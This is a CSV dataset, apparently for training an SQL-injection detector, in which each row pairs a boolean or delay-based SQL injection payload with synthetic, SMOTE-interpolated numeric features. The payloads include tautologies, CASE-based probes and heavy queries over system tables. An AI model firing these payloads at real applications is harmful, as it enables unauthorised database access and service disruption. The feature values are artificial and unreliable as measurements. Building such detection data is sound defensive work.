id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000028,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R000119,6.5270980409229375,279.7463107580413,38.10606900068437,3.9296765825798095,100.95462100615931,31.63258625085546,104.73865525153983,42.420448249486725,0.3579824811636312,0.11312383433300797,0.37571388148732016,0.15317980301604073,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.0,2.526517250171092,3.473482749828908,9.893930999315632,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.5265172501710922,0.0,0.0,0.5265172501710921,1.0,0.4734827498289078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5265172501710922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.946965499657816,0.0,0.0,0.0,0.0,0.0,0.0,0.5265172501710922,0.5265172501710922,10.053034500342184
SMOTE_000029,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,1.1813137943466798,239.03702793300664,36.433126939792125,3.782410491259345,69.16563469896063,35.97325077591685,95.57201241466962,38.32613004345953,0.2880200143223677,0.1533149897099994,0.39879454919636387,0.15987044677126905,0.0,1.0,2.0,0.0,0.0,2.0,0.0,20.406377715708977,0.0,1.486625387958425,3.4866253879584255,11.946501551833702,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.973250775916851,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.973250775916851
SMOTE_000030,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",nearest_attack_euclidean,R000141,0.9973269255213454,125.21501231183755,28.24300246236751,4.15546320842254,84.0,3.243002462367512,25.486004924735028,12.486004924735022,0.6710389450991275,0.02584941662903595,0.20348145179239832,0.09963018647943811,2.2709926128974653,0.7290073871025348,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,2.2430024623675116,1.0,0.7569975376324884,0.24300246236751155,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000031,attack,boolean,1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,nearest_attack_euclidean,R000036,1.115874484191117,350.4345836415178,31.71729182075892,3.2710474903001723,89.44510501417406,47.42406226886162,164.85864591037947,48.7067704481027,0.2552007417965711,0.13534340275391915,0.47044408658417486,0.1390117688653349,0.8586459103794598,0.5654163584821608,0.1413540896205402,0.0,0.0,1.14135408962054,0.0,34.85864591037946,0.2827081792410804,0.0,0.0,11.28270817924108,0.8586459103794597,0.1413540896205402,0.0,0.8586459103794598,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.1413540896205402,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.141354089620542
SMOTE_000032,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,1.21851917910456,66.41653647382253,26.0,3.8680580284020483,15.977308234412035,19.696922354117284,21.71961411970525,9.022691765587963,0.24386526133208342,0.29613493918594114,0.3250305358371977,0.13496926364477774,0.32576941147067906,0.674230588529321,2.0,0.0,0.0,2.0,0.0,2.348461177058642,0.0,0.674230588529321,0.6742305885293209,4.325769411470679,0.32576941147067895,0.674230588529321,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.32576941147067895,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.325769411470679
SMOTE_000033,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000025,0.07011754569510063,37.92026425918421,13.039867870407898,2.605257548806592,3.0,9.0,19.9202642591842,6.000000000000002,0.0791325133300676,0.2373975399902029,0.5252049200195942,0.15826502666013526,1.0,0.0,0.03986787040789763,0.0,0.0,1.0,0.0,2.980066064796052,0.9800660647960511,0.0,0.0,1.039867870407897,1.0,0.0,0.019933935203948816,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000034,attack,boolean,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,1.5628212968187971,140.96638925702706,33.09182255607779,4.143351941941184,75.52182942991432,12.676368635517475,38.01455295327621,14.753638238319054,0.5378794082869857,0.08760164536943245,0.26916285992456335,0.10535608641901859,0.0,0.5845460794396844,2.0,0.0,1.0,1.5845460794396844,0.0,4.584546079439684,0.0,0.0,2.0,4.584546079439685,0.0,0.5845460794396845,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.5845460794396844,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5845460794396846
SMOTE_000035,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000027,0.6143787676546695,225.40970077104825,29.0,3.4927047490769625,118.62866511408437,12.0,71.78103565696388,23.0,0.5262777823539836,0.05327769998227781,0.3183289260310394,0.10211559163269913,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.69525891424097,0.30474108575902936,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.847629457120485,0.15237054287951474,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000039,0.41737568267654224,43.09956185105182,14.912852978718186,3.4726950502588716,14.63899708510273,9.365141191487274,12.730282382974544,6.365141191487275,0.3402458134811305,0.2180162851339603,0.29449193425660614,0.14724596712830307,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.18257059574363765,0.0,0.0912852978718186,0.0912852978718186,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.09128529787181872,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,boolean,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000063,1.297544330779878,155.91436644497207,34.832676127134874,4.195227109224726,75.0816903178372,18.0,41.58366193643256,21.249014190702315,0.4814440305615249,0.11550414231987348,0.2669075525157416,0.13614427460286002,1.832676127134878,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.416338063567439,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.416338063567439,0.0,1.0,1.0,0.41633806356743897,0.583661936432561,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.416338063567439
SMOTE_000038,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000146,0.5903121415571748,140.00709245490515,38.83609151024089,4.020157583528741,45.66745471721168,21.66981886884673,52.334909434423366,20.334909434423366,0.3267199872243711,0.15404872569411268,0.37418272162308075,0.14504856545843542,4.667454717211683,0.0,2.0,1.0,0.0,1.8337273586058411,0.0,9.0,0.0,0.0,1.0,5.667454717211682,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.8337273586058412,0.0,0.8337273586058414,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6674547172116823
SMOTE_000039,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000040,0.8940891369799081,249.97474369030033,36.76070208049049,3.797149558104132,75.04280832196197,34.60702080490492,98.56421248294295,41.76070208049049,0.30034918052015214,0.13798767871140677,0.39444276544528944,0.1672203753231517,0.0,0.0,2.0,0.0,0.0,1.760702080490492,0.0,22.0,0.0,2.0,4.0,13.760702080490493,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.7607020804904918,0.0,0.23929791950950807,0.7607020804904919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.760702080490493
SMOTE_000040,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000011,1.3869521814352863,115.89962763550082,27.6986891100592,3.685940235113319,41.94325936804641,16.602621779881602,43.73801580828321,13.615730679289605,0.3562979599727868,0.15229686221040756,0.37705341368758727,0.11435176412921835,0.0,0.0,0.0,0.0,1.0,1.3013108899408004,0.0,7.205243559763201,0.0,2.2052435597632014,1.903932669822401,2.3013108899408,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.3013108899408004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3013108899408
SMOTE_000041,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000107,1.3432378160913592,55.39065566053182,22.39065566053182,3.736778631807933,13.60934433946818,18.171966981595457,18.0,5.6093443394681834,0.24579375305951445,0.3278626745969835,0.3249896747111777,0.10135389763232437,0.0,1.0,1.6093443394681817,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.6093443394681817,0.0,1.0,0.6093443394681815,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.6093443394681815,0.39065566053181844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000078,0.5691055665326644,38.000000000000014,13.853096434524257,2.6766367802313757,3.0,9.0,20.0,6.000000000000002,0.0789473684210526,0.23684210526315788,0.5263157894736842,0.15789473684210525,0.14690356547574224,0.0,1.706192869048516,0.0,0.0,1.0,0.0,3.0,0.146903565475742,0.0,0.0,2.7061928690485155,0.14690356547574202,0.0,0.853096434524258,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000043,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000044,0.8947935753535198,236.01013227139566,35.87044628446919,3.7460389206960825,68.91700828011135,28.43522314223459,95.48178513787676,43.17611571117297,0.29116634565185756,0.12113630337202881,0.4050478024846528,0.1826495484914608,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.870446284469185,1.9999999999999998,1.7176115711172968,3.7176115711172972,10.870446284469189,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.282388428882703,0.717611571117297,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.4352231422345945,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.435223142234594
SMOTE_000044,attack,boolean,"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000057,0.7580406642305155,242.6831681122148,37.450379912196034,3.776259552818831,73.4770895170782,27.702279473176215,98.05341920976431,43.45037991219604,0.30300517698438717,0.1133226334895299,0.40396574101708804,0.17970644850899486,0.0,1.0,2.0,0.0,0.0,1.225189956098018,0.0,22.450379912196034,0.774810043901982,2.0,4.0,13.225189956098019,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.22518995609801798,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.225189956098017
SMOTE_000045,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000107,1.4146910676321531,56.595100671297615,23.59510067129762,3.8269784699078544,15.595100671297622,17.0,17.601224832175596,6.398775167824406,0.2746992688823428,0.3007344494878091,0.3116658100728199,0.1129004715570282,0.3987751678244049,0.6012248321755953,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.398775167824405,0.3987751678244046,0.6012248321755954,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.39877516782440475,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3987751678244047
SMOTE_000046,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,0.6743242708302678,147.8870562518519,32.77741125037038,4.303273493841337,85.33223375111113,8.777411250370378,37.0,16.777411250370378,0.5770048467214903,0.05932376817852904,0.2502413739131935,0.11343001118678711,4.0,0.0,0.0,0.0,1.0,1.2225887496296222,0.0,4.0,0.0,0.0,2.777411250370378,2.222588749629622,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.222588749629622,0.7774112503703778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000103,1.897540911077683,171.30836865816835,33.794420894554435,3.8089134317569338,51.55139477636139,24.0,66.85976343452974,28.897210447277217,0.30096837441372903,0.14014091243171728,0.39005244360756675,0.1688382695469869,2.3458156709158238,0.0,0.0,0.0,0.0,1.448605223638608,0.0,14.205579105445569,0.0,1.4486052236386078,2.1027895527227844,8.345815670915824,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.44860522363860794,0.0,0.4486052236386079,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7569738818069607,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.654184329084176
SMOTE_000048,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,1.1603239418762334,139.16629108723282,31.493517516775544,4.06236172179783,68.28833153019598,9.301296496644891,41.87795955703685,19.69870350335511,0.49185236789482645,0.0676783024243382,0.29809660840976415,0.14237272127107126,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.096110510065326,0.9999999999999998,1.506482483224456,3.301296496644891,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000094,4.1935805818652705,338.38644385807913,40.67382303440887,3.875437308048167,118.67382303440888,34.673823034408876,135.9529213763549,49.08587641290648,0.3526852275200735,0.10296855667475993,0.39974756190126276,0.14459865390390386,4.0,0.0,0.0,0.0,0.0,1.3261769655911266,0.0,28.738230344088734,0.0,2.3261769655911264,3.673823034408873,10.02146910322662,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3261769655911267,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.347646068817745,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.673823034408873
SMOTE_000050,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000018,1.3973155922900542,118.64175015150923,31.905499898993845,3.712366844248026,35.915375176760776,14.726374974748461,48.27362502525154,19.72637497474846,0.30229166774579225,0.12426930857987153,0.40700508100076344,0.16643394267357275,5.179124924245384,0.0,0.0,0.7263749747484614,0.0,1.7263749747484614,0.0,8.547250050503077,1.7263749747484611,0.27362502525153876,1.5472500505030775,2.4527499494969223,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.7263749747484612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.27362502525153864,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,0.4029779077283519,125.12228909935698,28.89228580831547,3.909793337165145,61.44543167441056,8.861713533476228,40.353714849892825,14.461429041577357,0.4866643239593864,0.0738670278422587,0.32413231329186787,0.115336334906487,0.0,0.0,1.784571616630943,0.0,1.0,1.0,0.0,6.0,0.0,0.10771419168452834,1.8922858083154717,3.7845716166309433,0.0,0.0,0.8922858083154714,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,2.6114940801010382,101.52876204640916,27.860896118382755,3.969494946043706,48.30448059191377,10.48119482451034,29.962389649020682,12.780696980964365,0.46684293986039693,0.09492298804615568,0.30072771077962457,0.1375063613138228,0.0,0.540099568709195,2.0,0.0,1.0,2.0,0.0,2.7004978435459757,0.0,0.0,1.08019913741839,5.459900431290805,0.0,0.540099568709195,1.0,0.0,0.0,1.0,0.540099568709195,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000053,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000084,0.020385663977515185,128.97516478089483,28.995032956178964,4.269622407162618,84.0,3.9950329561789637,26.990065912357924,13.990065912357924,0.6512932082023528,0.030973905490341763,0.2092641318835967,0.10846875442370874,0.014901131463112227,2.985098868536888,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,2.995032956178963,1.0,0.004967043821037298,0.9950329561789628,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000022,0.0972707584634561,347.70102455575756,29.961054191346804,3.250459011452482,80.0,50.15578323461279,164.54524132114477,53.0,0.23012556741890122,0.14423522437470568,0.473181019791371,0.15245818841502207,0.0,3.922108382693605,1.0,0.0,0.0,2.0,0.0,34.11683742595959,1.9610541913468025,0.0,0.0,13.0,0.0,0.9805270956734013,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
